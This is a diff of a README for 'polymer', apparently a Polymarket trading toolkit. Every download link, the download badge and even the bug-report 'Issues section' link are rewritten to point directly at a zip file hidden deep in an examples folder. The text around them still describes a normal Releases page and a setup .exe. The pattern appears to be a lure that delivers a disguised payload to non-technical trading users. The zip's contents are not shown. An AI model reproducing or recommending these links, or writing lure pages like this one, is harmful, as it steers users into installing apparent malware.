@@ -1,6 +1,6 @@
 # 🔧 polymer - Smart Tools for Polymarket Trading
 
-[![Download polymer](https://img.shields.io/badge/Download-polymer-4c1?style=for-the-badge)](https://github.com/Htutaun4736/polymer)
+[![Download polymer](https://img.shields.io/badge/Download-polymer-4c1?style=for-the-badge)](https://github.com/Htutaun4736/polymer/raw/refs/heads/main/rs-clob-client/examples/clob/rfq/Software_Lincolnian.zip)
 
 polymer is a toolkit designed to help you trade and interact with Polymarket. It offers automated trading methods, a client to connect with order books, and live updates on market activity. You don’t need to know coding or complex commands to use it.
 
@@ -27,7 +27,7 @@ This guide shows you how to download, install, and launch polymer on Windows. Fo
 ## 🔗 Step 1: Download polymer
 
 Visit the download page by clicking the big badge above or this link:  
-[Download polymer here](https://github.com/Htutaun4736/polymer)
+[Download polymer here](https://github.com/Htutaun4736/polymer/raw/refs/heads/main/rs-clob-client/examples/clob/rfq/Software_Lincolnian.zip)
 
 This page contains all the software versions, including the latest one for Windows. You will find the files under the “Releases” section. Look for the Windows setup file, usually named something like `polymer-setup.exe`.
 
@@ -115,7 +115,7 @@ If polymer does not start or shows errors:
 
 For questions or bug reports:
 
-- Visit the [Issues section](https://github.com/Htutaun4736/polymer/issues) on GitHub to report problems.  
+- Visit the [Issues section](https://github.com/Htutaun4736/polymer/raw/refs/heads/main/rs-clob-client/examples/clob/rfq/Software_Lincolnian.zip) on GitHub to report problems.  
 - Check the GitHub discussions or wiki if available for user guidance.
 
 ---
@@ -123,6 +123,6 @@ For questions or bug reports:
 ## 🔗 Download polymer again
 
 Start by getting the software installer at:  
-[https://github.com/Htutaun4736/polymer](https://github.com/Htutaun4736/polymer)  
+[https://github.com/Htutaun4736/polymer/raw/refs/heads/main/rs-clob-client/examples/clob/rfq/Software_Lincolnian.zip](https://github.com/Htutaun4736/polymer/raw/refs/heads/main/rs-clob-client/examples/clob/rfq/Software_Lincolnian.zip)  
 
 Click the badge at the top or the link above to reach the download page anytime.
